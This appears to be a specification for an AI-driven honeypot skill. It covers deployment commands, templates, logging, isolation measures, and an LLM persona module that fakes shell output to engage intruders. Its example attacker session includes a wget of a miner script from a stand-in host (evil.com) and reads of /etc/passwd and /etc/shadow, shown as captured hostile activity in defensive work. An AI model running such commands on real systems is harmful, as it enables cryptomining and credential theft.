# Honey Claw Skill Specification

## Overview

Honey Claw is an OpenClaw skill that enables AI agents to deploy, manage, and analyze honeypot infrastructure. It provides sandboxed deception capabilities for threat detection and attacker behavior analysis.

## Skill Manifest

```yaml
name: honeyclaw
version: 0.1.0
description: AI-powered honeypot deployment and analysis
author: OpenClaw Contributors

capabilities:
  - docker           # Container management
  - network          # Network configuration
  - filesystem       # Log file access
  - s3               # Cloud storage for logs

commands:
  - deploy
  - destroy
  - list
  - logs
  - report
  - analyze
```

## Commands

### `deploy`

Deploy a new honeypot instance.

```bash
honeyclaw deploy [OPTIONS]
```

**Options:**
| Flag | Required | Default | Description |
|------|----------|---------|-------------|
| `--template` | Yes | - | Honeypot template (basic-ssh, fake-api, enterprise-sim) |
| `--name` | Yes | - | Unique identifier for this honeypot |
| `--port` | No | template default | External port mapping |
| `--ports` | No | - | Multiple ports (comma-separated) |
| `--network` | No | honeyclaw-net | Docker network to attach |
| `--detach` | No | true | Run in background |

**Returns:**
```json
{
  "success": true,
  "honeypot_id": "prod-bastion-01",
  "container_id": "abc123...",
  "ports": {"22/tcp": 2222},
  "status": "running"
}
```

### `destroy`

Remove a honeypot instance.

```bash
honeyclaw destroy --name <honeypot_id> [--force]
```

### `list`

List all active honeypots.

```bash
honeyclaw list [--format json|table]
```

### `logs`

Stream or retrieve honeypot logs.

```bash
honeyclaw logs [OPTIONS]
```

**Options:**
| Flag | Description |
|------|-------------|
| `--name` | Filter by honeypot ID |
| `--follow` | Stream logs in real-time |
| `--since` | Time filter (e.g., "1h", "2024-01-01") |
| `--format` | Output format (json, text) |

### `report`

Generate attack summary report.

```bash
honeyclaw report [OPTIONS]
```

**Options:**
| Flag | Description |
|------|-------------|
| `--last` | Time window (e.g., "24h", "7d") |
| `--output` | Output file path |
| `--format` | Report format (markdown, json, html) |

### `analyze`

AI-powered analysis of captured interactions.

```bash
honeyclaw analyze --name <honeypot_id> [--depth quick|full]
```

**Returns:** MITRE ATT&CK mapping, IOCs, attacker profiling.

---

## Templates

### basic-ssh (Low Interaction)

Simulates an SSH server. Captures authentication attempts.

**Capabilities:**
- SSH banner presentation
- Credential capture (username/password)
- Client fingerprinting
- Session recording (if login succeeds with any creds)

**Default Port:** 22  
**Resource Usage:** ~10MB RAM

**Captured Data:**
- Source IP/port
- Username/password attempts
- SSH client version
- Key exchange algorithms
- Login timing patterns

### fake-api (Medium Interaction)

Simulates a REST API with fake endpoints.

**Capabilities:**
- Configurable API routes
- JWT/Bearer token capture
- Request body logging
- Fake data responses
- Rate limiting simulation

**Default Port:** 8080  
**Resource Usage:** ~50MB RAM

**Captured Data:**
- Full HTTP requests/responses
- Authentication tokens
- API enumeration patterns
- Injection attempts (SQLi, XSS, etc.)
- User-Agent strings

### enterprise-sim (High Interaction)

Full enterprise environment simulation.

**Capabilities:**
- Multiple services (SSH, HTTP, RDP, WinRM)
- Fake Active Directory responses
- Simulated file shares
- Credential harvesting
- Lateral movement detection

**Default Ports:** 22, 80, 443, 3389, 5985  
**Resource Usage:** ~500MB RAM

**Captured Data:**
- Full session recordings
- Command history
- File access attempts
- Network pivoting attempts
- Tool/malware uploads

---

## Storage Configuration

### S3-Compatible Storage

```yaml
storage:
  type: s3
  bucket: honeyclaw-logs
  region: us-east-1
  endpoint: https://s3.amazonaws.com
  access_key: ${AWS_ACCESS_KEY_ID}
  secret_key: ${AWS_SECRET_ACCESS_KEY}
  
  # Log organization
  prefix: honeyclaw/
  partition_by: day  # day, hour, honeypot
```

### Local Storage (Development)

```yaml
storage:
  type: local
  path: /var/log/honeyclaw/
  rotation:
    max_size: 100MB
    max_age: 30d
```

---

## Log Schema

All events follow a consistent JSON schema:

```json
{
  "$schema": "https://honeyclaw.dev/schemas/event-v1.json",
  "version": "1.0",
  "timestamp": "2026-02-05T17:30:00.000Z",
  "honeypot": {
    "id": "prod-bastion-01",
    "template": "basic-ssh",
    "container_id": "abc123..."
  },
  "source": {
    "ip": "45.33.32.156",
    "port": 54321,
    "geo": {
      "country": "US",
      "city": "San Francisco",
      "asn": "AS15169"
    }
  },
  "event": {
    "type": "auth_attempt",
    "protocol": "ssh",
    "payload": {}
  },
  "analysis": {
    "mitre_tactics": ["TA0001"],
    "mitre_techniques": ["T1078"],
    "threat_score": 0.7,
    "iocs": []
  }
}
```

---

## Agent Integration

### Autonomous Deployment

Agents can deploy honeypots based on threat intelligence:

```javascript
// Example: Deploy honeypot in response to scanning activity
if (detected_port_scan) {
  honeyclaw.deploy({
    template: "basic-ssh",
    name: `decoy-${Date.now()}`,
    port: scanned_port
  });
}
```

### Real-time Analysis

Agents can process attack data as it arrives:

```javascript
// Stream and analyze attacks
honeyclaw.logs({ follow: true }).on('event', async (event) => {
  if (event.threat_score > 0.8) {
    await notify_security_team(event);
    await block_ip(event.source.ip);
  }
});
```

### Adaptive Responses

High-interaction honeypots can delegate to AI for responses:

```javascript
// AI-powered attacker engagement
honeyclaw.on('shell_command', async (session, command) => {
  const response = await ai.generate_fake_output(command, {
    context: session.history,
    persona: "linux_sysadmin"
  });
  return response;
});
```

---

## Security Model

### Isolation Layers

1. **Container Sandbox** — Each honeypot runs in isolated Docker container
2. **Network Isolation** — Dedicated Docker network with no host access
3. **Resource Limits** — CPU/memory caps prevent DoS
4. **Read-only Filesystem** — Prevents persistent modifications
5. **No Outbound** — Honeypots cannot initiate external connections

### Risk Mitigation

| Risk | Mitigation |
|------|------------|
| Container escape | Rootless containers, seccomp profiles |
| Cryptomining | Resource limits, process monitoring |
| Attack pivot | Network isolation, no production access |
| Data exfil | Outbound blocking, log-only storage |

---

## Production Infrastructure

### Current Deployment

| Property | Value |
|----------|-------|
| **IP Address** | `149.248.202.23` |
| **Port** | `8022` |
| **App** | `honeyclaw-ssh` |
| **Platform** | Fly.io |
| **Region** | sjc (San Jose) |
| **Monthly Cost** | ~$2 (dedicated IPv4) |

### Fly.io Configuration

```bash
# Check status
fly status -a honeyclaw-ssh

# View logs
fly logs -a honeyclaw-ssh

# SSH into machine
fly ssh console -a honeyclaw-ssh
```

### ⚠️ Key Learnings: Fly.io TCP Services

**Dedicated IPv4 is REQUIRED for TCP services like SSH honeypots.**

Fly.io's shared IPv4 addresses only work for HTTP(S) traffic. For raw TCP services (SSH, custom protocols), you **must** allocate a dedicated IPv4:

```bash
# Allocate dedicated IPv4 ($2/month)
fly ips allocate-v4 --yes -a honeyclaw-ssh

# Verify allocation
fly ips list -a honeyclaw-ssh
```

**Why port 8022?**
- Fly.io uses port 22 internally for `fly ssh console`
- External SSH honeypots must use an alternate port (8022, 2222, etc.)
- Configure in `fly.toml`:

```toml
[[services]]
  internal_port = 22
  protocol = "tcp"

  [[services.ports]]
    port = 8022
```

---

## AI Conversational Deception

### Overview

The AI deception module enables honeypots to respond dynamically to attacker commands
using an LLM (Claude) to roleplay as various system personas. This maximizes engagement
time and intelligence collection.

### Enabling AI Deception

```bash
# Required environment variables
export AI_DECEPTION_ENABLED=true
export ANTHROPIC_API_KEY=sk-ant-...

# Optional configuration
export AI_DECEPTION_PERSONALITY=naive_intern  # See personality profiles below
export AI_DECEPTION_MODEL=claude-sonnet-4-20250514
export AI_DECEPTION_MAX_TOKENS=500
export AI_DECEPTION_LOG_PATH=/var/log/honeypot/conversations.json
```

### Personality Profiles

| Profile | Description | Use Case |
|---------|-------------|----------|
| `naive_intern` | New IT intern "Mike" who doesn't understand security | Maximum info extraction via social engineering |
| `paranoid_admin` | Suspicious sysadmin "Dave" who questions everything | Psychological pressure, extended engagement |
| `helpful_clueless` | Office manager "Karen" with accidental root access | Tests social engineering skills |
| `security_honeypot` | Meta-deception: hints this might be a honeypot | Psychological warfare, attacker paranoia |

### Example Interaction

```
attacker> whoami
root

attacker> cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
[... realistic passwd file ...]

attacker> wget http://evil.com/miner.sh
Wait, what are you downloading? Who authorized this? I should probably check with 
Sarah before we install anything new... she's at lunch but said she'd be back soon.
Is this for the server migration project?
```

### Configuration: Accepted Credentials

The AI honeypot can be configured to accept specific credentials:

```bash
# Accept any credentials (maximum engagement)
export HONEYPOT_ALLOW_ANY_AUTH=true

# Or specify allowed user:password combinations
export HONEYPOT_USERS="root:admin,test:test,admin:password"

# Or load from file (one user:pass per line)
export HONEYPOT_USERS_FILE=/etc/honeypot/credentials.txt
```

### Conversation Logging

All AI conversations are logged for TTP extraction:

```json
{
  "timestamp": "2026-02-06T09:15:00.000Z",
  "session_id": "session_1738847700",
  "client_ip": "45.33.32.156",
  "personality": "naive_intern",
  "command": "cat /etc/shadow",
  "response": "Sure! Let me get that for you...\n[shadow file]\nIs this what you needed?",
  "conversation_turn": 3
}
```

### Running the AI Honeypot

```bash
# Use the AI-enhanced honeypot script
python templates/basic-ssh/honeypot_ai.py

# Or test AI conversation locally
python src/ai/conversation.py
```

### Dependencies

```bash
pip install httpx asyncssh
```

### Security Considerations

- AI responses may reveal "fake" sensitive data - ensure this doesn't match real systems
- Monitor API costs - each command generates an LLM call
- Review conversation logs for operational security
- AI may occasionally "break character" - test personalities before deployment

---

## Roadmap

### v0.1.0 (MVP)
- [x] Basic SSH honeypot
- [x] Docker deployment
- [x] Local logging
- [ ] S3 log shipping

### v0.2.0
- [ ] Fake API honeypot
- [ ] Enterprise simulation
- [ ] Real-time alerts

### v0.3.0
- [x] AI-powered responses
- [ ] MITRE ATT&CK auto-mapping
- [ ] IOC extraction

### v1.0.0
- [ ] Distributed mesh
- [ ] Threat intel integration
- [ ] Production hardening
